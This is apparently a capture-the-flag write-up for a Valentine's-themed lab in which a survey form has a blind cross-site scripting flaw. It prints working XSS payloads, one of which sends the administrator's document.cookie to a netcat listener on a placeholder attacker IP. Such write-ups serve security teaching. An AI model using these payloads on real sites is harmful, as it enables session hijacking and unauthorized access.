# Cupid's Matchmaker

## **Objective**

Exploit a blind Cross-Site Scripting (XSS) vulnerability in a survey form to steal the administrator's session cookie and gain access to the admin panel, ultimately retrieving the flag.

## **Methodology**

### **1. Initial Reconnaissance**

- The application contains a survey form with a field:
    
    **"What's your idea of a perfect Valentine's Day date? ***
    
    Below this field, a hint reads:
    
    *"Our team reads every word! Be creative and specific."*
    
    This indicates that submitted data is reviewed by the team, likely in an admin panel, suggesting a potential blind XSS vector.
    
- Performed directory enumeration using `dirsearch` and discovered an `/admin` endpoint, which presents a login page. This confirms the existence of an administrative interface.

### **2. Blind XSS Confirmation**

- To test if the survey input is vulnerable to XSS and executed in the admin's context, a simple payload was submitted:
    
    html
    
    ```
    <img src=x onerror="new Image().src='http://<burp-collaborator-url>'">
    ```
    
- After a short delay, a request appeared in Burp Collaborator, confirming that the payload executed and triggered an HTTP request from the admin's browser.

### **3. Cookie Theft Payload**

- With the vulnerability confirmed, a more specific payload was crafted to capture the admin's cookies and send them to an attacker-controlled server.
- Set up a Netcat listener to receive the incoming request:
    
    bash
    
    ```
    nc -lvnp 4444
    ```
    
- Submitted the following payload in the survey field:
    
    html
    
    ```
    <img src=x onerror="new Image().src='http://<attacker-ip>:4444/?data='+encodeURIComponent(document.cookie)">
    ```
    
- After a few minutes, the Netcat listener received a GET request containing the admin's cookies in an encoded format.

### **4. Decoding the Flag**

- The captured data appeared as a URL-encoded string. It was decoded using a Python one-liner:
    
    bash
    
    ```
    python3 -c "import urllib.parse; print(urllib.parse.unquote('<encoded-string>'))"
    ```
    
- The decoded output revealed the flag in the format `THM{...}`.

## **Flag Obtained**

text

```
THM{...}
```

## **Conclusion**

The application was vulnerable to blind XSS because user-supplied input in the survey form was not properly sanitized before being viewed by an administrator. This allowed an attacker to execute arbitrary JavaScript in the admin's browser and steal session cookies, leading to unauthorized access. Proper input validation and output encoding would have prevented this attack.